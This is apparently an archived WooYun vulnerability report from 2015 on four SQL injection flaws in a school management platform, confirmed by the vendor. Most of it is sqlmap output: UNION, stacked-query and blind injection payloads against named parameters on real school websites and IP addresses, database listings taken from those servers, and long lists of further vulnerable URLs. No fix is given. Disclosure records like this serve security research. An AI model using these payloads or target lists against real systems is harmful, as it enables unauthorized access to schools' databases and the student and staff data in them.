{"id": 30586, "wybug_id": "wooyun-2015-0116233", "wybug_title": "某数字化校园平台4处SQL注入漏洞打包", "wybug_corp": "山西华兴科软有限公司", "wybug_author": "Taro", "wybug_date": "2015-05-26 14:07", "wybug_open_date": "2015-08-28 22:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向公众公开  简要描述： rt... 详细说明：  第一处：http://www.sxsmyxx.cn/tsims/NewsList.asp?T_Name=xxxx&lx=99\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: lx    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: T_Name=xxxx&lx=99' UNION ALL SELECT NULL,CHAR(113)+CHAR(117)+CHAR(100)+CHAR(97)+CHAR(113)+CHAR(83)+CHAR(84)+CHAR(86)+CHAR(121)+CHAR(69)+CHAR(99)+CHAR(111)+CHAR(109)+CHAR(101)+CHAR(88)+CHAR(113)+CHAR(110)+CHAR(99)+CHAR(117)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: T_Name=xxxx&lx=99'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: T_Name=xxxx&lx=99' WAITFOR DELAY '0:0:5'-----[10:30:44] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2005available databases [29]: [*] bb[*] db_bmxt_2015[*] db_jsjzz[*] db_jx_zypt[*] db_Multiple[*] db_my_jz[*] db_myxqhz_0909[*] DB_TradeSchool[*] db_tsimsmyxx[*] db_zypt_zypt[*] EPWeb_SXSMYXX[*] Hxkr_kc_myxx[*] Hxkr_kc_qyyr[*] HyServices02[*] master[*] model[*] msdb[*] myxx_stkglxt[*] MyxxTeachingPractice[*] psy[*] ReportServer[*] ReportServerTempDB[*] RGPsyWeb[*] rsksj[*] ssreadervideo[*] sxmyexam[*] tempdb[*] twxxcl-no[*] twxxcl_KC\nhttp://www.nxsdx.com/tsims/NewsList.asp?T_Name=xxxx&lx=99\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: lx    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: T_Name=xxxx&lx=99' UNION ALL SELECT NULL,CHAR(113)+CHAR(111)+CHAR(101)+CHAR(109)+CHAR(113)+CHAR(72)+CHAR(113)+CHAR(68)+CHAR(87)+CHAR(112)+CHAR(99)+CHAR(101)+CHAR(86)+CHAR(75)+CHAR(83)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: T_Name=xxxx&lx=99'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: T_Name=xxxx&lx=99' WAITFOR DELAY '0:0:5'-----[10:34:58] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 8 or 2012web application technology: ASP.NET, ASP, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2005available databases [11]: [*] cxjsxx[*] db_Multiple[*] db_tsimsnxsl[*] Hxkr_kc_nxsl[*] master[*] model[*] msdb[*] nxslxqhz[*] psy[*] RGPsyWeb[*] tempdb\nhttp://www.hbjdxx.com.cn/tsims/NewsList.asp?T_Name=xxxx&lx=99http://www.sxsmyxx.cn/tsims/NewsList.asp?T_Name=xxxx&lx=99http://www.sxjzwx.com/tsims/NewsList.asp?T_Name=xxxx&lx=99http://60.223.236.3/tsims/NewsList.asp?T_Name=xxxx&lx=99http://www.hlbrgjjx.cn:8086/NewsList.asp?T_Name=xxxx&lx=99http://61.133.219.181/tsims/NewsList.asp?T_Name=xxxx&lx=99http://124.163.243.26:4000/NewsList.asp?T_Name=xxxx&lx=99http://www.ndjd.cn:8003//NewsList.asp?T_Name=xxxx&lx=99http://www.nxsdx.com/tsims/NewsList.asp?T_Name=xxxx&lx=99第二处：http://www.sxsmyxx.cn/tsims/sfxjs_NewsShow.asp?lm=%EF%BF%BD%EF%BF%BD%EF%BF%BD%E8%B6%AF%CC%AC&bh=409\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: bh    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: lm=%EF%BF%BD%EF%BF%BD%EF%BF%BD%E8%B6%AF%CC%AC&bh=409' AND 9045=9045 AND 'kEtU'='kEtU    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: lm=%EF%BF%BD%EF%BF%BD%EF%BF%BD%E8%B6%AF%CC%AC&bh=-3778' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(116)+CHAR(114)+CHAR(115)+CHAR(113)+CHAR(120)+CHAR(70)+CHAR(66)+CHAR(87)+CHAR(78)+CHAR(70)+CHAR(71)+CHAR(79)+CHAR(86)+CHAR(99)+CHAR(113)+CHAR(119)+CHAR(105)+CHAR(99)+CHAR(113)--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: lm=%EF%BF%BD%EF%BF%BD%EF%BF%BD%E8%B6%AF%CC%AC&bh=409' AND 1467=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'ZPQL'='ZPQL---[11:03:05] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2005available databases [29]:                                                [*] bb[*] db_bmxt_2015[*] db_jsjzz[*] db_jx_zypt[*] db_Multiple[*] db_my_jz[*] db_myxqhz_0909[*] DB_TradeSchool[*] db_tsimsmyxx[*] db_zypt_zypt[*] EPWeb_SXSMYXX[*] Hxkr_kc_myxx[*] Hxkr_kc_qyyr[*] HyServices02[*] master[*] model[*] msdb[*] myxx_stkglxt[*] MyxxTeachingPractice[*] psy[*] ReportServer[*] ReportServerTempDB[*] RGPsyWeb[*] rsksj[*] ssreadervideo[*] sxmyexam[*] tempdb[*] twxxcl-no[*] twxxcl_KC\nhttp://124.163.243.26:4000/sfxjs_NewsShow.asp?lm=1&bh=409\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: bh    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: lm=1&bh=409' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(115)+CHAR(117)+CHAR(98)+CHAR(113)+CHAR(119)+CHAR(122)+CHAR(103)+CHAR(122)+CHAR(90)+CHAR(68)+CHAR(86)+CHAR(103)+CHAR(87)+CHAR(109)+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: lm=1&bh=409'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: lm=1&bh=409' WAITFOR DELAY '0:0:5'-----[11:10:20] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2005available databases [10]:                                                [*] db_jx_zypt_mx[*] db_my_jz_mx[*] db_TsimsXzzyjsxy[*] db_zypt_zypt_mx[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\nhttp://www.ndjd.cn:8003/sfxjs_NewsShow.asp?lm=1&bh=409http://61.133.219.181/tsims/sfxjs_NewsShow.asp?lm=1&bh=409http://www.hlbrgjjx.cn:8086/sfxjs_NewsShow.asp?lm=1&bh=409http://60.223.236.3/tsims/sfxjs_NewsShow.asp?lm=1&bh=409http://www.sxsmyxx.cn/tsims/sfxjs_NewsShow.asp?lm=1&bh=409http://www.nxsdx.com/tsims/sfxjs_NewsShow.asp?lm=1&bh=409http://www.hbjdxx.com.cn/tsims/sfxjs_NewsShow.asp?lm=1&bh=409http://www.sxjzwx.com/tsims/sfxjs_NewsShow.asp?lm=1&bh=409http://www.sxsmyxx.cn/tsims/sfxjs_cgzsShow.asp?lm=1&bh=50第三处：http://124.163.243.26:4000/kb/kb.asp?id=14\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: id=14 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(102)+CHAR(113)+CHAR(110)+CHAR(113)+CHAR(114)+CHAR(85)+CHAR(105)+CHAR(87)+CHAR(83)+CHAR(77)+CHAR(111)+CHAR(70)+CHAR(106)+CHAR(76)+CHAR(113)+CHAR(116)+CHAR(97)+CHAR(119)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=14; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=14 WAITFOR DELAY '0:0:5'-----[11:40:24] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2005available databases [10]:                                                [*] db_jx_zypt_mx[*] db_my_jz_mx[*] db_TsimsXzzyjsxy[*] db_zypt_zypt_mx[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\nhttp://www.hlbrgjjx.cn:8086/kb/kb.asp?id=14\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: id=14 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(122)+CHAR(115)+CHAR(111)+CHAR(113)+CHAR(71)+CHAR(118)+CHAR(88)+CHAR(118)+CHAR(73)+CHAR(98)+CHAR(78)+CHAR(114)+CHAR(68)+CHAR(104)+CHAR(113)+CHAR(111)+CHAR(115)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=14; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=14 WAITFOR DELAY '0:0:5'-----[11:38:29] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2005available databases [10]:                                                [*] db_lscj[*] db_tsimshlbe[*] db_wx_xxpt[*] Hxkr_kc_hlbejx[*] Hxkr_kc_nxsl[*] master[*] model[*] msdb[*] studentsys[*] tempdb\nhttp://www.sxsmyxx.cn/tsims/kb/kb.asp?id=14http://www.sxjzwx.com/tsims/kb/kb.asp?id=14http://www.sxsmyxx.cn/tsims/kb/kb.asp?id=14http://www.nxsdx.com/tsims/kb/kb.asp?id=14http://www.hbjdxx.com.cn/tsims/kb/kb.asp?id=14http://60.223.236.3/tsims/kb/kb.asp?id=14http://61.133.219.181/tsims/kb/kb.asp?id=14http://www.ndjd.cn:8003/kb/kb.asp?id=14第四处：http://www.sxsmyxx.cn/tsims/xl.asp?xqi=2&xnian=2013-2014\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: xqi    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: xqi=2' AND 7534=7534 AND 'rTYV'='rTYV&xnian=2013-2014    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: xqi=-4130' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(97)+CHAR(106)+CHAR(109)+CHAR(113)+CHAR(110)+CHAR(81)+CHAR(77)+CHAR(110)+CHAR(98)+CHAR(89)+CHAR(103)+CHAR(83)+CHAR(90)+CHAR(108)+CHAR(113)+CHAR(105)+CHAR(111)+CHAR(108)+CHAR(113)-- &xnian=2013-2014    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: xqi=2'; WAITFOR DELAY '0:0:5'--&xnian=2013-2014    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: xqi=2' WAITFOR DELAY '0:0:5'--&xnian=2013-2014---[12:07:55] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2005available databases [29]:                                                [*] bb[*] db_bmxt_2015[*] db_jsjzz[*] db_jx_zypt[*] db_Multiple[*] db_my_jz[*] db_myxqhz_0909[*] DB_TradeSchool[*] db_tsimsmyxx[*] db_zypt_zypt[*] EPWeb_SXSMYXX[*] Hxkr_kc_myxx[*] Hxkr_kc_qyyr[*] HyServices02[*] master[*] model[*] msdb[*] myxx_stkglxt[*] MyxxTeachingPractice[*] psy[*] ReportServer[*] ReportServerTempDB[*] RGPsyWeb[*] rsksj[*] ssreadervideo[*] sxmyexam[*] tempdb[*] twxxcl-no[*] twxxcl_KC\nwww.nxsdx.com/tsims/xl.asp?xqi=2&xnian=2013-2014http://www.sxsmyxx.cn/tsims/xl.asp?xqi=2&xnian=2013-2014http://60.223.236.3/tsims/xl.asp?xqi=2&xnian=2013-2014http://www.hlbrgjjx.cn:8086//xl.asp?xqi=2&xnian=2013-2014http://61.133.219.181/tsims/xl.asp?xqi=2&xnian=2013-2014http://124.163.243.26:4000/xl.asp?xqi=2&xnian=2013-2014http://www.ndjd.cn:8003/xl.asp?xqi=2&xnian=2013-2014http://www.hbjdxx.com.cn/tsims/xl.asp?xqi=2&xnian=2013-2014   漏洞证明：     修复方案：     版权声明：转载请注明来源 Taro@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-30 22:28 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}